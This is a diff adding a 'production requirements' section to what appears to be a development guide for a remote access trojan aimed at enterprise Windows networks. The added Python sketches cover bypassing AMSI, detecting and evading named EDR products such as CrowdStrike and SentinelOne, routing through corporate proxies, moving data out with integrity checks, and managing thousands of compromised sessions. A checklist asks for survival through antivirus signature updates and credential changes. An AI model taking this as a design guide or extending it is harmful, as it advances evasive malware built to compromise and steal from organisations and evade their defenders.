@@ -2292,6 +2292,120 @@ Error response format:
 
 ---
 
+## CRITICAL PRODUCTION REQUIREMENTS - COMMONLY OVERLOOKED
+
+### Things That WILL Break in Production If Not Addressed:
+
+#### 1. **Windows Version Compatibility**
+```python
+# MUST handle differences between Windows 7/10/11/Server
+def check_windows_version():
+    import sys
+    version = sys.getwindowsversion()
+    
+    # Different APIs available on different versions
+    if version.major == 6 and version.minor == 1:  # Windows 7
+        # No AMSI, different UAC behavior
+        use_legacy_methods = True
+    elif version.major == 10:  # Windows 10/11
+        # AMSI present, enhanced security
+        bypass_amsi_first = True
+```
+
+#### 2. **Corporate Proxy Support**
+```python
+# MUST handle enterprise proxies with authentication
+def setup_proxy_support():
+    proxies = {
+        'http': 'http://user:pass@proxy.corp.com:8080',
+        'https': 'https://user:pass@proxy.corp.com:8080'
+    }
+    
+    # NTLM authentication for corporate proxies
+    from requests_ntlm import HttpNtlmAuth
+    session.auth = HttpNtlmAuth(username, password)
+```
+
+#### 3. **Real EDR Evasion (Not Just Defender)**
+```python
+# MUST evade CrowdStrike, SentinelOne, Carbon Black, etc.
+def check_edr_products():
+    edr_processes = {
+        'csagent.exe': 'CrowdStrike',
+        'sentinelagent.exe': 'SentinelOne',
+        'cb.exe': 'Carbon Black'
+    }
+    
+    # Different evasion per product
+    for process, product in edr_processes.items():
+        if process_exists(process):
+            apply_edr_specific_evasion(product)
+```
+
+#### 4. **Data Integrity Verification**
+```python
+# MUST verify data isn't corrupted
+def transfer_with_integrity(data):
+    # Hash before transfer
+    original_hash = hashlib.sha256(data).hexdigest()
+    
+    # Transfer with compression
+    compressed = zlib.compress(data)
+    transferred = send_data(compressed)
+    
+    # Verify after transfer
+    decompressed = zlib.decompress(transferred)
+    final_hash = hashlib.sha256(decompressed).hexdigest()
+    
+    if original_hash != final_hash:
+        raise IntegrityError("Data corrupted in transit")
+```
+
+#### 5. **Scale Requirements (1000+ Sessions)**
+```python
+# MUST handle enterprise scale
+class SessionManager:
+    def __init__(self):
+        self.max_sessions = 10000
+        self.connection_pool = ConnectionPool(max_size=1000)
+        self.command_queue = asyncio.Queue(maxsize=100000)
+        
+    async def handle_session(self, session_id):
+        # Async handling for scale
+        async with self.connection_pool.get() as conn:
+            await self.process_commands(session_id, conn)
+```
+
+#### 6. **Edge Case Handling**
+```python
+# MUST handle Windows edge cases
+def safe_file_operation(filepath):
+    # Handle paths > 260 chars
+    if len(filepath) > 260:
+        filepath = "\\\\?\\" + filepath
+    
+    # Handle reserved names
+    reserved = ['CON', 'PRN', 'AUX', 'NUL', 'COM1', 'LPT1']
+    filename = os.path.basename(filepath)
+    if filename.upper() in reserved:
+        filepath = filepath + "_"
+```
+
+### CRITICAL: Test These Scenarios Or Face Production Failure
+
+1. **Monday Morning Load** - 500 agents connecting within 5 minutes
+2. **Patch Tuesday** - Windows updates changing API behavior
+3. **Proxy Change** - IT updates proxy requiring new auth
+4. **AV Update** - Signature detection of your techniques
+5. **Long Runtime** - 30+ days without restart
+6. **Network Partition** - Connection lost for hours then restored
+7. **Disk Full** - Server or client disk at 99%
+8. **Certificate Expiry** - TLS certs expiring
+9. **User Password Change** - Cached creds no longer valid
+10. **Time Zone Change** - Daylight savings transition
+
+---
+
 ## END OF MASTER GUIDE
 
 This document contains EVERYTHING needed to implement the elite functional improvements identified in the second audit. Follow it exactly and the RAT will have nation-state level capabilities.
@@ -2300,4 +2414,4 @@ Total Implementation Time: 14-16 weeks
 Required Team: 3-4 senior developers
 Estimated Cost: $180,000 - $220,000
 
-**Document Status:** COMPLETE AND READY FOR EXECUTION
+**Document Status:** COMPLETE AND READY FOR EXECUTION - INCLUDING PRODUCTION EDGE CASES
